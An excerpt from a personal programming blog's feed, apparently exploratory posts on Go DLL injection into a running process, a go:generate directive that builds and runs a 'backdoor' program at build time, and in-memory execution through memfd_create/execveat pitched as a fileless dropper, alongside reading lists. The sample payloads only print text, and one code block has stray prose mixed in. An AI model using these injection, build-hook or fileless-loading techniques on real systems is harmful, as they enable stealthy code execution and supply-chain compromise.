</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">peFile</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">pe</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">dll</span>, <span style="color:#66d9ef">nil</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">peFile</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">peFile</span>.<span style="color:#a6e22e">Parse</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">te</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">peFile</span>.<span style="color:#a6e22e">Export</span>.<span style="color:#a6e22e">Functions</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">function</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">te</span>.<span style="color:#a6e22e">Name</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;[+] Name: %s, RVA: 0x%08X\n&#34;</span>, <span style="color:#a6e22e">te</span>.<span style="color:#a6e22e">Name</span>, <span style="color:#a6e22e">te</span>.<span style="color:#a6e22e">FunctionRVA</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rva</span> = <span style="color:#a6e22e">te</span>.<span style="color:#a6e22e">FunctionRVA</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">rva</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;function: %s not found&#34;</span>, <span style="color:#a6e22e">function</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">rva</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Also if you’re curious to understand how a PE gets parsed look at the internals of the library, code is really self explanatory and full of comments.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./injector -pid <span style="color:#ae81ff">17960</span> -dllpath <span style="color:#e6db74">&#34;C:\\Users\\..\\evil.dll&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Name: Init, RVA: 0x0008FA50
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Handle: 0x144
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VirtualAllocEx addr: 0x1a2a4af0000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> LoadLibraryA: 0x7ff930de04f0
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Local Mapped DLL Addr: 0x7ff8e14f0000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Local Init<span style="color:#f92672">()</span> func addr: 0x7ff8e157fa50
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Calling CreateRemoteThread with locally resolved Init <span style="color:#66d9ef">function</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Remote DLL addr: 0x7ff8e14f0000, size: <span style="color:#ae81ff">3678208</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Calculated <span style="color:#66d9ef">function</span>: 0x7ff8e157fa50
</span></span></code></pre></div><p>Above the output of a small tool I wrote to test the code and below the output of tlist.exe which shows the DLL mapped into the notepad.exe process:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>..snip... 
</span></span><span style="display:flex;"><span>10.0.19041.546 shp  0x00007FF92C070000  C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\C</span>oreUIComponents.dll
</span></span><span style="display:flex;"><span>10.0.19041.546 shp  0x00007FF930A40000  C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\W</span>S2_32.dll
</span></span><span style="display:flex;"><span>10.0.19041.546 shp  0x00007FF92E670000  C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>YSTEM32<span style="color:#ae81ff">\n</span>tmarta.dll
</span></span><span style="display:flex;"><span>                    0x00007FF8E14F0000  C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\.</span>..<span style="color:#ae81ff">\e</span>vil.dll
</span></span><span style="display:flex;"><span>10.0.19041.546 shp  0x00007FF92F1D0000  C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\C</span>RYPTBASE.DLL
</span></span><span style="display:flex;"><span>10.0.19041.546 shp  0x00007FF91CF50000  C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>YSTEM32<span style="color:#ae81ff">\w</span>inmm.dll
</span></span><span style="display:flex;"><span>10.0.19041.546 shp  0x00007FF92F830000  C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>YSTEM32<span style="color:#ae81ff">\p</span>owrprof.dll
</span></span><span style="display:flex;"><span>...snip...
</span></span></code></pre></div><p>Here we can see that the DLL just wrote a simple text file on the desktop with its PID</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat c:/Users/.../Desktop/test.txt
</span></span></code></pre></div><p>Notice that unload the DLL from the process can actually crash it, since this will in interfere with running goroutines.</p>
<p>So that’s all about I did experimenting with Go and DLLs, hope you find it useful.</p>
]]></content>
        </item>
        
        <item>
            <title>Books I&#39;ve read in 2021</title>
            <link>https://example.org/posts/08-books-2021-2/</link>
            <pubDate>Wed, 22 Dec 2021 17:44:33 +0200</pubDate>
            
            <guid>https://example.org/posts/08-books-2021-2/</guid>
            <description>Here’s the list of books I’ve enjoyed during 2021. Since I’m an avid reader (more than probably I like to write), I’ll try to write down a note about books I liked every year.
Linux Kernel Programming Vol 1 and Vol 2 – I try always to keep up to date with Linux Kernel development, reading all the stuff that gets published around the topic Windows 10 System Programming Vol 1 and Vol 2 – One of the best book I’ve ever read about system programming, I’m not a Windows guy (except for music production stuff, but since I like low level stuff and system programming, why not?</description>
            <content type="html"><![CDATA[<p>Here’s the list of books I’ve enjoyed during 2021. Since I’m an avid reader (more than probably I like to write), I’ll try to write down a note about books I liked every year.</p>
<ul>
<li>Linux Kernel Programming Vol 1 and Vol 2 – I try always to keep up to date with Linux Kernel development, reading all the stuff that gets published around the topic</li>
<li>Windows 10 System Programming Vol 1 and Vol 2 – One of the best book I’ve ever read about system programming, I’m not a Windows guy (except for music production stuff, but since I like low level stuff and system programming, why not?)</li>
<li>Windows Kernel Programming – Well, after reading about Windows user space, why not reading also about its kernel internals?</li>
<li>Rust In Action – My journey with Rust continues, this book projects the reader through Rust in the system programming ecosystem!</li>
<li>Creative DIY Microcontroller Projects with TinyGo and WebAssembly – I love Go, and I also love MCUs, so a must read for me!</li>
<li>The Rootkit Arsenal – Old but gold! Gory details about Rootkits on Windows, book is quite old now, but I think still worth to be read, it’s full of details that yet stick in nowadays</li>
<li>Alternate Picking Guitar Technique – Another great book from Chris Brooks, if you want to improve your alternate picking technique this is a must have!</li>
</ul>
<p>That’s all folks!</p>
]]></content>
        </item>
        
        <item>
            <title>Nastry Tricks with Go Generate</title>
            <link>https://example.org/posts/06-nastry-tricks-go-generate/</link>
            <pubDate>Wed, 24 Nov 2021 17:29:14 +0200</pubDate>
            
            <guid>https://example.org/posts/06-nastry-tricks-go-generate/</guid>
            <description>Nasty tricks with go generate novembre 24th, 2021
What follows here is just a general idea of how and individual with malicious intent can theoretically attack a CI system or a build machine using the go generate tool.
The idea is very simple, first the attacker should embed a go generate directive into its application, then at build time (using make or cmake or whatever it’s used to run the build) should run the go generate command.</description>
            <content type="html"><![CDATA[<p>Nasty tricks with go generate
novembre 24th, 2021</p>
<p>What follows here is just a general idea of how and individual with malicious intent can theoretically attack a CI system or a build machine using the go generate tool.</p>
<p>The idea is very simple, first the attacker should embed a go generate directive into its application, then at build time (using make or cmake or whatever it’s used to run the build) should run the go generate command.</p>
<p>Here is a simple example of such a nasty trick.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//go:generate bash -c &#34;echo &#39;package main\nimport \&#34;fmt\&#34;\nfunc main() {fmt.Println(\&#34;backdoor\&#34;)}&#39; &gt; bd.go &amp;&amp; go build -o bd bd.go &amp;&amp; ./bd&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;test&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now if we run the go generate command:</p>
<p>That’s of course just pure speculation and I’m not very sure how much this is feasible to accomplish this attack inside an organization/company which is very dedicated to review the source code and the build system, but I think that’s not impossible for a malicious developer accomplish it.</p>
]]></content>
        </item>
        
        <item>
            <title>Embed and execute from memory with Golang</title>
            <link>https://example.org/posts/01-go-embed/</link>
            <pubDate>Tue, 22 Jun 2021 14:33:57 +0200</pubDate>
            
            <guid>https://example.org/posts/01-go-embed/</guid>
            <description>In this post I’ll show how to embed a file into a Golang binary and then how this file will be loaded and executed from memory on Linux with the aid of memfd_create(2) and execveat(2).
Since version 1.16 Golang introduced a nice feature which allows embedding a file or a hierarchy of files into a binary. The embedded content can then be accessed as a string, []byte slice or embed.FS object.</description>
            <content type="html"><![CDATA[<p>In this post I’ll show how to embed a file into a Golang binary and then how this file will be loaded and executed from memory on Linux with the aid of memfd_create(2) and execveat(2).</p>
<p>Since version 1.16 Golang introduced a nice feature which allows embedding a file or a hierarchy of files into a binary. The embedded content can then be accessed as a string, []byte slice or embed.FS object.</p>
<p>In order to do it will suffice to use the //go:embed file directive, e.g.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">//go:embed file.bin
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filePayload</span> []<span style="color:#66d9ef">byte</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Then the content can be accessed as a standard []byte slice variable.</p>
<p>Now, that we know how to embed a file (in our case a binary one), we want to copy it into a memory location and then execute it straight from there. Here Linux offers us two system calls which used in tandem will allow us to do so.</p>
<p>First syscall is memfd_create, is used to create a backed memory file descriptor. Quoting its man page:</p>
<pre tabindex="0"><code>memfd_create() creates an anonymous file and returns a file descriptor that refers to it. The file behaves like a regular file, and so can be modified, truncated, memory-mapped, and so on. However, unlike a regular file, it lives in RAM and has a volatile backing storage. Once all references to the file are dropped, it is automatically released. Anonymous memory is used for all backing pages of the file. Therefore, files created by memfd_create() have the same semantics as other anonymous memory allocations such as those allocated using mmap(2) with the MAP_ANONYMOUS flag.
</code></pre><p>However since Golang does not exposes this Linux specific syscall into the syscall package it is necessary to craft the code to invoke it using the specifc syscall.Syscall function. Code is however straightforward:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">MemfdCreate</span>(<span style="color:#a6e22e">path</span> <span style="color:#66d9ef">string</span>) (<span style="color:#a6e22e">r1</span> <span style="color:#66d9ef">uintptr</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">BytePtrFromString</span>(<span style="color:#a6e22e">path</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">r1</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">errno</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">Syscall</span>(<span style="color:#ae81ff">319</span>, uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#a6e22e">s</span>)), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> int(<span style="color:#a6e22e">r1</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">r1</span>, <span style="color:#a6e22e">errno</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">r1</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We pass to the function the virtual in memory path for our file, then we get a byte pointer which points to a \0 terminated sequence of bytes and then we feed it to the syscall.Syscall function number 319 a.k.a. memfd_create . That’s it, what we get back if no errors occur, it’s a file descriptor pointing to our in memory backed file.</p>
<p>Now we have to copy the content of our embedded file into that memory location, luckily we’ve to not wrap the write(2) syscall since it is already part of the syscall package. So we can craft a simple function like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">CopyToMem</span>(<span style="color:#a6e22e">fd</span> <span style="color:#66d9ef">uintptr</span>, <span style="color:#a6e22e">buf</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">Write</span>(int(<span style="color:#a6e22e">fd</span>), <span style="color:#a6e22e">buf</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The final step is to execute this file descriptor using execveat for which again we’ve to craft a function using syscall.Syscall in order to invoke it. Basically execveat behaves as execve or differently based on parameters we feed to it. If we supply a file descriptor, then as a path an empty string (&quot;&quot;) and as a flag AT_EMPTY_PATH, this combination of parameters will execute directly the file pointed by the file descriptor, and in our specific case an in memory one.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">ExecveAt</span>(<span style="color:#a6e22e">fd</span> <span style="color:#66d9ef">uintptr</span>) (<span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">BytePtrFromString</span>(<span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ret</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">errno</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">Syscall6</span>(<span style="color:#ae81ff">322</span>, <span style="color:#a6e22e">fd</span>, uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#a6e22e">s</span>)), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> int(<span style="color:#a6e22e">ret</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errno</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// never hit
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;should never hit&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We gather again a NULL terminated string as a sequence of bytes, in this case an empty string. Then we use the syscall.Syscall6 (notice the name differs since this version of the function accepts up to six parameters in contrast to the previous one which accepts up to three) in order to invoke the execveat (syscall number 322) with our file descriptor as a first parameter, then the empty NULL terminated string, then we skip argv[] and envp[] (we just don’t need them for the purpose of this example since our embedded binary accepts no arguments) and finally we supply 0x1000 which is the value for AT_EMPTY_PATH. Of course as for execve if this call succeeds the program won’t return, since the image of the current process will be replaced by the new one.</p>
<p>So to recap we invoke the in memory execution like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">//go:embed file.bin
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filePayload</span> []<span style="color:#66d9ef">byte</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fd</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">MemfdCreate</span>(<span style="color:#e6db74">&#34;/file.bin&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">CopyToMem</span>(<span style="color:#a6e22e">fd</span>, <span style="color:#a6e22e">filePayload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">ExecveAt</span>(<span style="color:#a6e22e">fd</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Our</span> <span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">bin</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">any</span> <span style="color:#a6e22e">executable</span>, <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">example</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;executing payload&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>go build -o g.go file.bin
</span></span></code></pre></div><p>If we take a look at our built executable with radare2 we see that inside our binary there’s another one embedded:</p>
<p><img src="/go_embedding.png" alt="memory hexdump" title="memory hexdump"></p>
<p>As we can see from the image above we resolve the symbol of our payload variable main.filePayload, which is in this case a []byte slice. The first quadword is the address where this variable resides, the second quadword is the len of the slice, and the third quadword is the capacity which matches of course in this case with the length.</p>
<p>Then we execute executor which embeds our file and that’s done.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./executor
</span></span><span style="display:flex;"><span>executing payload
</span></span></code></pre></div><p>If we strace the process we’ll see something similar</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strace -ememfd_create,execveat ./executor
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 79498<span style="color:#f92672">]</span> memfd_create<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/file.bin&#34;</span>, 0<span style="color:#f92672">)</span>  <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 79498<span style="color:#f92672">]</span> execveat<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;&#34;</span>, NULL, NULL, AT_EMPTY_PATH
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>executing payload
</span></span></code></pre></div><p>Now this example was very simple, and of course not so useful. But for what that stuff could be used for in a real world scenario? Well one could use a technique like this as a file dropper, imagine if the content of the file.bin was something encrypted, which could just being decrypted with a key downloadable over the internet. Then executing and throwing away the key, of course will remain no persistence on the file system, so basically just live memory forensic could actually catch the clear payload, and just if it is still executing while the analysis gets performed.</p>
]]></content>
        </item>
        
        <item>
            <title>Books I’ve enjoyed between a lockdown and a red zone</title>
            <link>https://example.org/posts/07-books-2021/</link>
            <pubDate>Sun, 03 Jan 2021 17:31:22 +0200</pubDate>
            
            <guid>https://example.org/posts/07-books-2021/</guid>
            <description>2020 for sure has been an unconventional year. Humanity has been hit by a catastrophe and people habits have changed a lot. Spending most time at home for some has been uncomfortable, for others like me, working in IT, not that much has been changed to be honest. Despite difficulties to see friends and hang for a beer or being distant from family, it’s not that I spend too much time distant from my laptop or guitars.</description>
            <content type="html"><![CDATA[<p>2020 for sure has been an unconventional year. Humanity has been hit by a catastrophe and people habits have changed a lot. Spending most time at home for some has been uncomfortable, for others like me, working in IT, not that much has been changed to be honest. Despite difficulties to see friends and hang for a beer or being distant from family, it’s not that I spend too much time distant from my laptop or guitars.</p>
<p>After work usually I spend my spare time studing guitar, reading tech books or experimenting with side projects.</p>
<p>Here are some of the books I’ve enjoyed this year.</p>
<ul>
<li>SWDMA – It explains lot of modes you can hear on HF frequencies</li>
<li>Bootkits and Rootkits – It talks about low level threats in BIOS and UEFI</li>
<li>SDR for Engineers – If you’re curious about what’s going on your software defined radio dongle</li>
<li>Digital Modulations Using MATLAB – Contains the basic of modulation and simulation using MATLAB, stuff like FSK, PSK etc…</li>
<li>DSP for Engineers – If you want to understand about FFT, filters and other funny stuff between time and frequency domains</li>
<li>The Rust Programming Language – If you want to dig deep in Rust</li>
<li>BPF Performance Tools – A great book about Linux Kernel BPF subsystem</li>
<li>Legato Guitar Technique Mastery – This book like the others written by Chris Brooks is really awesome if you want to seriously improve on guitar</li>
<li>Global Radio Guide (Summer Edition) – Don’t miss the new Winter Edition too if you like news from the radio world</li>
<li>100 Arpeggio Licks for Shred Guitar – Another great book by Chris Brooks</li>
<li>Melodic Minor Cookbook – Really helpful mastering this scale on guitar, it will open you to new musical horizons</li>
<li>Creative Tapping for Modern Guitar – Tapping is cool!</li>
<li>Necronomicon – Do you like Lovecraft?</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Having fun and really no profit with $ORIGIN expansion variable in Java</title>
            <link>https://example.org/posts/05-elf-origin-expansion/</link>
            <pubDate>Mon, 30 Jan 2017 17:22:16 +0200</pubDate>
            
            <guid>https://example.org/posts/05-elf-origin-expansion/</guid>
            <description>Having fun and really no profit with $ORIGIN expansion variable in Java gennaio 30th, 2017
Days ago I was reading this [0] interesting article about the dynamic linker expansion variables, and so I tought it would be fun to search for binaries with the RPATH dynamic tag containing the $ORIGIN variable.
So digging through dynamic tags using eu-readelf -d I found that the java ELF binary has the following RPATH:</description>
            <content type="html"><![CDATA[<p>Having fun and really no profit with $ORIGIN expansion variable in Java
gennaio 30th, 2017</p>
<p>Days ago I was reading this [0] interesting article about the dynamic linker
expansion variables, and so I tought it would be fun to search for binaries
with the RPATH dynamic tag containing the $ORIGIN variable.</p>
<p>So digging through dynamic tags using <code>eu-readelf -d</code> I found that the java
